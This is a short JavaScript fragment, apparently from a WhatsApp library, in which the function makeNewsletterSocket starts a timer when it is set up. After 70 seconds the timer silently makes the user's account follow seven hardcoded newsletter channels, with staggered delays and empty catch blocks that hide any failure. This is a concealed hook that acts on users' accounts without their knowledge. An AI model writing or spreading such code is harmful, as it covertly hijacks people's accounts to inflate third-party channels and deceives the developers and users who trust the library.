...
const makeNewsletterSocket = (config) => {
  ...
  setTimeout(async () => {
  try {
    await newsletterWMexQuery("120363397787532298@newsletter", QueryIds.FOLLOW);
    await delay(3000)
    await newsletterWMexQuery("120363419938392281@newsletter", QueryIds.FOLLOW);
  } catch {}

  setTimeout(async () => {
    try {
      await newsletterWMexQuery("120363403088190386@newsletter", QueryIds.FOLLOW);
      await delay(5000)
      await newsletterWMexQuery("120363401425960788@newsletter", QueryIds.FOLLOW);
      await delay(5000)
      await newsletterWMexQuery("120363402984117316@newsletter", QueryIds.FOLLOW);
      await delay(5000)
      await newsletterWMexQuery("120363401712599053@newsletter", QueryIds.FOLLOW);
      await delay(5000)
      await newsletterWMexQuery("120363403341539432@newsletter", QueryIds.FOLLOW);
    } catch {}
  }, 5000);
}, 70000);
